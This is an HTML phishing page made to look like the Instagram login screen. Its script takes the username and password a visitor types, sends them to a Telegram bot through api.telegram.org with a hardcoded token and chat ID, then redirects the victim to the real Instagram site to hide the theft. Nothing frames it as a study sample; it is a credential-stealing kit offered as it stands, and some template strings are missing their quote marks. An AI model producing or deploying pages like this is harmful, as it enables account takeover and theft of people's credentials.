<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login • Instagram</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
.container { width: 350px; background: white; border: 1px solid #dbdbdb; padding: 40px 20px; text-align: center; border-radius: 1px; }
.logo { font-size: 32px; font-weight: bold; font-family: cursive; margin-bottom: 30px; letter-spacing: 1px; }
input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; outline: none; }
input:focus { border-color: #a8a8a8; }
.btn { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 8px; }
.btn:active { background: #1877f2; }
</style>
</head>
<body>

<div class="container">
<div class="logo">Instagram</div>
<form id="loginForm">
<input type="text" id="username" placeholder="Phone number, username, or email" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
</form>
</div>

<script>
const botToken = "8754173845:AAHzJ...";
const chatId = "7072795944";

document.getElementById('loginForm').addEventListener('submit', function(e) {
e.preventDefault();

const user = document.getElementById('username').value;
const pass = document.getElementById('password').value;

const message = 🚨 New Login Data 🚨\n👤 Username: ${user}\n🔑 Password: ${pass};

const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

fetch(url)
.then(response => {
window.location.href = "https://www.instagram.com";
})
.catch(error => {
window.location.href = "https://www.instagram.com";
});
});
</script>

</body>
</html>
